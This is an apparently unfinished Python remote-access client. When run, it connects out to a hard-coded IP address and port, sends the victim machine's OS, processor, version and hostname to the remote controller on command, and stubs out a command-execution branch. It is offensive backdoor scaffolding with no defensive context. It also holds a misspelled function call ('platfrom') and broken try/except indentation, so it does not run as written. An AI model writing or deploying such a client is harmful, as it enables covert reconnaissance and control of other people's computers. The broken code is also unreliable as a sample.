import socket
import os
import subprocess
from multiprocessing import Process,current_process
import struct
import platform

def start_session(s):
    while True:
        try:
            cmd = s.recv(1024).decode()

            if "OS" in cmd:
                os_name = platform.system()
                os_processor = platform.processor()
                os_info = platform.platfrom()
                os_user = platform.node()
                details = "Operating System : %s\n"%(str(os_name))
                details += "Processor : %s\n"%(str(os_processor))
                details += "Version : %s\n"%(str(os_info))
                details += "User(node) : %s\n"%(str(os_user))
                s.send(details.encode())

            if "execute" in cmd:
                cmd = cmd.strip("execute ")
                #Pending...

        #    cmd_size = struct.unpack("<H",cmd[:2])
        #    cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
        #    if "execute" in cmd:
        #        cmd = cmd.strip("execute ")
    except Exception as e:
            print(str(e))

def main():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("142.93.197.240",2003))
    conn_process = Process(target=start_session,args=(s,))
    conn_process.start()

if __name__ == '__main__':
    main()
